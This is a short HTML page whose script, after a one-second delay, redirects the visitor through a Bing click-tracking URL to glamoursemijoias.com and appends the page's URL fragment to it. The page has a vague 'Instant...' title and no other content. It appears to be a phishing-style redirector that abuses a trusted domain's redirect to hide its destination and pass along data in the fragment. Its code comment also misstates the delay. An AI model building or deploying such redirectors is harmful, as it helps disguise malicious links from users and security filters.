<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instant...</title>
</head>
<body>

    <script type="text/javascript">
        // Set the base URL you want to redirect to
        var redirectUrl = "https://www.bing.com/ck/a?!&&p=b45c5a05a052421ceed7cbddff1dffa4279ff821a560313741e946b1eb8dc018JmltdHM9MTczMzE4NDAwMA&ptn=3&ver=2&hsh=4&fclid=32889ee5-e768-680f-0a76-8bc4e6b56941&psq=glamoursemijoias.com&u=a1aHR0cHM6Ly9nbGFtb3Vyc2VtaWpvaWFzLmNvbS8&ntb=1";

        // Get the current URL's fragment (everything after #)
        var fragment = window.location.hash;

        // If there's a fragment, append it to the redirect URL
        if (fragment) {
            redirectUrl += fragment;
        }

        // Set the delay time in milliseconds (2000 = 2 seconds)
        var delayTime = 1000;

        // Redirect after the specified delay
        setTimeout(function() {
            window.location.href = redirectUrl;
        }, delayTime);
    </script>
    
</body>
</html>
